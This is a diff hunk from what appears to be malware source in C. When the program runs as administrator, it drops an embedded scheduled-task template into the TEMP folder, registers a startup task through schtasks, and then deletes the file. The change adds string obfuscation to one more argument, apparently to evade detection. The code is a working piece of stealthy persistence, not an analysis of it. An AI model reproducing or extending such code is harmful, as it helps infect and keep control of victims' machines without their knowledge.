@@ -76,7 +76,7 @@ int main(int argc, char *argv[])
             if (isAdmin) {
                 wchar_t tmpTaskTemplate[MAX_PATH] = { 0 };
                 combine_path(tmpTaskTemplate, get_env(pebenv, AYU_OBFUSCATEW(L"TEMP=")), AYU_OBFUSCATEW(L"#TMPXML"));
-                write_resource(resTaskTemplate, resTaskTemplateSize, tmpTaskTemplate, L"");
+                write_resource(resTaskTemplate, resTaskTemplateSize, tmpTaskTemplate, AYU_OBFUSCATEW(L""));
                 run_program(true, sysdir, schtasksPath, AYU_OBFUSCATEW(L"%S #STARTUPADDADMIN"), schtasksPath, tmpTaskTemplate);
                 delete_file(tmpTaskTemplate);
             }
